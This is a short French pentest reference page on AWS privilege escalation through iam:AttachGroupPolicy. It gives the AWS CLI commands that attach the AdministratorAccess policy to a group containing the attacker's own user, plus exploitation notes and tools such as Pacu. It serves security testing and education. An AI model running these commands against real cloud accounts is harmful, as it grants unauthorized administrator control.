---
title: "AttachGroupPolicy : attacher une politique privilégiée à votre groupe"
description: "iam:AttachGroupPolicy pour attacher une politique managée privilégiée à un groupe auquel vous appartenez."
keywords:
  - AttachGroupPolicy
  - group
  - managed policy
  - AdministratorAccess
  - attach
---

# AttachGroupPolicy

`iam:AttachGroupPolicy` attache une politique managée à un groupe. Parce qu'un utilisateur hérite de chaque politique des groupes auxquels il appartient, attacher `AdministratorAccess` à n'importe quel groupe contenant votre utilisateur vous élève.

## Attacher à votre groupe

```bash
aws iam list-groups-for-user --user-name <you>
aws iam attach-group-policy --group-name <your-group> \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## Notes d'exploitation

- Confirmez d'abord votre appartenance : l'escalade n'aboutit que si votre utilisateur fait partie du groupe ciblé.
- Vous ajouter plutôt à un groupe déjà privilégié relève de la voie [appartenance à un groupe](../group-membership.md).

## Outils

- **AWS CLI** (`iam attach-group-policy`).
- **Pacu** (`iam__privesc_scan`).

## Références

- [Rhino Security Labs : élévation de privilèges AWS (AttachGroupPolicy)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox : iam-vulnerable](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud : AWS](https://hackingthe.cloud/)
